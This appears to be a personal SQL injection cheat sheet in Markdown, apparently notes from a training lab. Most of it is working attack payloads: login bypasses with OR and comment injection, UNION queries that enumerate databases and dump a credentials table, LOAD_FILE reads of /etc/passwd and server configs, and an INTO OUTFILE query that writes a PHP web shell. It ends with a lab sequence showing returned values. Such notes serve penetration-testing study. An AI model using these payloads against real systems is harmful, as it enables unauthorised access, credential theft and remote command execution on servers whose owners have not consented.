## SQLi Discovery

|`'`|`%27`|
|`"`|`%22`|
|`#`|`%23`|
|`;`|`%3B`|
|`)`|`%29`|
>**ℹ️ Info:**
>In some cases, we may have to use the URL encoded version of the payload. An example of this is when we put our payload directly in the URL 'i.e. HTTP GET request'.

## Authentication Bypass
### OR Injection Bypass
> ⚠️ **PAY ATTENTION:**
> 
> Try both `or '1'='1` and `or '1'='1'`

If we know the username we can use the following payload in the username to bypass the login screen:
- `name' or '1'='1'`

We get something like this:
````sql
SELECT * FROM logins WHERE username='admin' or '1'='1' AND password = 'something';
````

If we don't know the username we have to use the same payload in both the username and password:
- `name' or '1'='1`
- `password' or '1'='1`

We get something like this:
```sql
SELECT * FROM logins WHERE username='' or '1'='1' AND password = '' or '1'='1';
```
>**ℹ️ Info:**
>
>Since it always returns TRUE we don't need to supply a user or password.
>We will be logged as the first user in the table!

### Comment Injection Bypass
We can use `-- -` to comment everything after it to bypass login screens or add our desired query.
>**ℹ️ Info**
>
>After the two dashes a space is needed to start a comment, to make it simpler an extra dash is added. `#` can also be used but they're considered tags in a URL within a browser so it's needed to URL encode it to `%23`.

We get something like this:
```sql
SELECT * FROM logins WHERE username='admin'-- - AND password = 'something';
```
We can see the AND check gets commented out.

We can now try to login as another user by creating a customized payload:
```sql
SELECT * FROM logins WHERE (username='') OR id = 5-- -' AND id > 1) AND password = 'd41d8cd98f00b204e9800998ecf8427e';
```
>**ℹ️ Info**
>
>We commented the AND id bigger than one verification to tell the login form to login as the user with id 5.

## Union Clause
The `UNION` clause allows us to retrieve results from multiple `SELECT` querys:
```sql
SELECT * FROM employees UNION SELECT * FROM departments;
```
For this to work the number of columns must match in both `SELECT` querys otherwise we will get an error:
```sql                                                                 
ERROR 1222 (21000): The used SELECT statements have a different number of columns
```
By adding `NULL` placeholders and going by trial and error we can guess the number of columns until we get the data back:
```sql
select * from employees UNION select dept_no,dept_name,NULL,NULL,NULL,NULL from departments;
```

## Union Injection
Before being able to exploit union based injections, we need to find the number of columns that the server uses, we can use:
- `' ORDER BY 1 -- -` and keep incrementing the number until nothing or an error returns.
- `' UNION select NULL,@@version-- -` and keep adding `NULL` until nothing or an error returns, using the built in `@@version` to check if the data is being returned.

### Database Enumeration
| Query | Description |
|---------------------------|--------------------------------------------|
| `SELECT @@version` | Fingerprint MySQL with query output |
| `SELECT SLEEP(5)` | Fingerprint MySQL with no output |
| `cn' UNION select 1,database(),2,3-- -` | Current database name |
| `cn' UNION select 1,schema_name,3,4 from INFORMATION_SCHEMA.SCHEMATA-- -` | List all databases |
| `cn' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema='dev'-- -` | List all tables in a specific database |
| `cn' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='credentials'-- -` | List all columns in a specific table |
| `cn' UNION select 1, username, password, 4 from dev.credentials-- -` | Dump data from a table in another database |

### Reading Files
First check what user we're on:
- `user()`

To read file from the host the user needs to have super privileges or `FILE` permission:
- `cn' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user-- -`
- `cn' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user WHERE user="root"-- -`
- `cn' UNION SELECT 1, grantee, privilege_type, 4 FROM information_schema.user_privileges WHERE grantee="'root'@'localhost'"-- -`

Then using `LOAD_FILE` we can read files:
- `cn' UNION SELECT 1, LOAD_FILE("/etc/passwd"), 3, 4-- -`
- `cn' UNION SELECT 1, LOAD_FILE("/var/www/html/index.php"), 3, 4-- -`

>**ℹ️ Info**
>
> We can only read files if the user running MySQL has enough privileges to do so.

### Writting Files
> ⚠️ **PAY ATTENTION:**
> 
> Be sure to check the paths of the web to discover places to write to.

To be able to write files to the back-end server using a MySQL database, we require three things:
- User with `FILE` privilege enabled
- MySQL global `secure_file_priv` variable not enabled
- Write access to the location we want to write to on the back-end server

To check for the `secure_file_priv` variable run:
```sql
cn' UNION SELECT 1, variable_name, variable_value, 4 FROM information_schema.global_variables where variable_name="secure_file_priv"-- -
```
>**ℹ️ Info**
>
> If the value is not set, that means we can write to all locations the OS user running MySQL has access to.

>**ℹ️ Info**
>
>To write a reverse shell we need to know in what folder the server is being hosted from, we can use the `LOAD_FILE` function to check `/etc/apache2/apache2.conf` and `/etc/nginx/nginx.conf` or IIS config at `%WinDir%\System32\Inetsrv\Config\ApplicationHost.config` for Windows.
>
>We can search online for other possible configuration locations. Furthermore, we may run a fuzzing scan and try to write files to different possible web roots, using this wordlist for [Linux](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-linux.txt) or this wordlist for [Windows](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-windows.txt). Finally, if none of the above works, we can use server errors displayed to us and try to find the web directory that way.

Here is a basic PHP web shell:
```sql
cn' union select "",'<?php system($_REQUEST[cmd]); ?>', "", "" into outfile '/var/www/html/shell.php'-- -
```


> ⚠️ **PAY ATTENTION:**
> 
>  Order for stuff to check when uploading file, fix needed!

```sql
' order by 6-- -
' UNION select NULL,database(),NULL,NULL,NULL-- -	ilfreight
' UNION select NULL,user(),NULL,NULL,NULL-- -	root@localhost
' UNION select NULL,grantee,privilege_type,NULL,NULL FROM information_schema.user_privileges WHERE grantee="'root'@'localhost'"-- -	FILE
' UNION select NULL,variable_name,variable_value,NULL,NULL FROM information_schema.global_variables where variable_name="secure_file_priv"-- -	EMPTY
' UNION select NULL,LOAD_FILE("/etc/apache2/apache2.conf"),NULL,NULL,NULL-- -
' UNION select NULL,LOAD_FILE("/etc/nginx/nginx.conf"),NULL,NULL,NULL-- -
' UNION select "",'<?php system($_REQUEST[cmd]); ?>',"","","" into outfile '/var/www/html/dashboard/shell.php'-- -
```
